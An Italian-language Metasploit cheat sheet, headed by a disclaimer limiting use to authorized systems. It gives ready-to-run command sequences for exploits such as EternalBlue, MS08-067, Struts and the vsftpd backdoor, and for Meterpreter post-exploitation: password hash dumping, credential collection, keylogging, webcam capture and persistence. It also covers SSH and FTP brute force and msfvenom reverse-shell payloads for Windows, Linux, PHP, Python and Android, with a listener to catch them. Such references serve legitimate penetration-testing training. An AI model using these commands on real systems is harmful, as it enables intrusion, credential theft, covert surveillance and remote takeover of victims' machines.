# Metasploit Framework — Guida ai Principali Comandi e Test

> **Avviso legale:** Metasploit è un framework di exploitation professionale. Utilizzarlo esclusivamente su sistemi e reti di cui si possiede l'autorizzazione esplicita. L'uso non autorizzato è illegale.

---

## 1. Installazione e avvio

### Su Kali Linux (già incluso)
```bash
msfconsole --version
```

### Avviare Metasploit
```bash
msfconsole
```

### Avviare in modalità silenziosa (senza banner)
```bash
msfconsole -q
```

### Aggiornare il database di exploit
```bash
msfupdate
```

### Avviare il database PostgreSQL (necessario per alcune funzioni)
```bash
systemctl start postgresql
msfdb init
```

---

## 2. Navigazione di base nella console

### Ottenere aiuto generale
```bash
help
```

### Cercare un modulo
```bash
search <termine>
search type:exploit platform:windows smb
search cve:2017-0144
```

### Usare un modulo
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### Tornare al menu principale
```bash
back
```

### Informazioni su un modulo
```bash
info
```

### Vedere le opzioni del modulo corrente
```bash
show options
```

### Vedere i payload disponibili
```bash
show payloads
```

### Vedere i target supportati
```bash
show targets
```

### Uscire da msfconsole
```bash
exit
```

---

## 3. Configurazione di un exploit

### Impostare l'host target (RHOSTS)
```bash
set RHOSTS 192.168.1.1
```

### Impostare la porta target (RPORT)
```bash
set RPORT 445
```

### Impostare l'IP locale (LHOST — per le reverse shell)
```bash
set LHOST 192.168.1.100
```

### Impostare la porta locale (LPORT)
```bash
set LPORT 4444
```

### Impostare il payload
```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

### Impostare il target
```bash
set TARGET 0
```

### Verificare tutte le opzioni impostate
```bash
show options
```

### Eseguire l'exploit
```bash
run
# oppure
exploit
```

### Eseguire l'exploit in background
```bash
exploit -j
```

---

## 4. Exploit comuni

### EternalBlue (MS17-010) — Windows SMB
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### MS08-067 — Windows XP/2003
```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
run
```

### Exploit Apache Struts
```bash
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 192.168.1.1
set RPORT 8080
run
```

### Exploit su servizio FTP vsftpd 2.3.4 (backdoor)
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.1
run
```

---

## 5. Meterpreter — comandi principali

Una volta ottenuta una sessione Meterpreter:

### Informazioni sistema
```bash
sysinfo          # info sul sistema
getuid           # utente corrente
getpid           # PID del processo
ps               # lista processi
```

### Navigazione filesystem
```bash
pwd              # directory corrente
ls               # lista file
cd /tmp          # cambia directory
cat file.txt     # leggi file
download file.txt /tmp/   # scarica file
upload /tmp/tool.exe C:\\  # carica file
```

### Privilegi e utenti
```bash
getuid           # utente attuale
getsystem        # tenta privilege escalation a SYSTEM
hashdump         # estrae hash delle password (richiede privilegi)
run post/windows/gather/credentials/credential_collector
```

### Rete
```bash
ipconfig         # configurazione rete
arp              # tabella ARP
netstat          # connessioni attive
portfwd add -l 8080 -p 80 -r 192.168.1.2   # port forward
```

### Pivot e shell
```bash
shell            # apre una shell di sistema
background       # mette la sessione in background
sessions -l      # lista sessioni attive
sessions -i 1    # ritorna alla sessione 1
```

### Screenshot e keylogger
```bash
screenshot                # cattura screenshot
keyscan_start             # avvia keylogger
keyscan_dump              # leggi tasti catturati
keyscan_stop              # ferma keylogger
```

### Webcam e microfono
```bash
webcam_list               # lista webcam
webcam_snap               # scatta foto
```

### Persistence
```bash
run persistence -h        # opzioni per persistence
```

---

## 6. Moduli Auxiliary (scansione e ricognizione)

### Scanner porte TCP
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389
run
```

### Scanner SMB
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

### Scanner SSH
```bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run
```

### Brute force SSH
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.1
set USER_FILE users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Brute force FTP
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.1
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Scanner vulnerabilità SMB (EternalBlue check)
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run
```

---

## 7. Generare payload con msfvenom

### Payload Windows reverse shell (exe)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

### Payload Linux reverse shell (elf)
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

### Payload PHP reverse shell
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
```

### Payload Python
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py
```

### Payload APK Android
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o shell.apk
```

### Listare tutti i payload disponibili
```bash
msfvenom -l payloads
```

### Listare i formati di output disponibili
```bash
msfvenom --list formats
```

---

## 8. Handler per ricevere connessioni

Dopo aver eseguito un payload su un target, è necessario un listener:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run -j   # avvia in background
```

---

## 9. Gestione sessioni

### Listare sessioni attive
```bash
sessions -l
```

### Interagire con una sessione
```bash
sessions -i 1
```

### Terminare una sessione
```bash
sessions -k 1
```

### Terminare tutte le sessioni
```bash
sessions -K
```

---

## 10. Database e workspace

### Verificare connessione al database
```bash
db_status
```

### Creare un nuovo workspace
```bash
workspace -a progetto1
```

### Cambiare workspace
```bash
workspace progetto1
```

### Importare risultati Nmap
```bash
db_import nmap-risultati.xml
```

### Eseguire Nmap direttamente da msfconsole
```bash
db_nmap -sS -sV 192.168.1.0/24
```

### Vedere gli host scoperti
```bash
hosts
```

### Vedere i servizi scoperti
```bash
services
```

### Vedere le credenziali trovate
```bash
creds
```
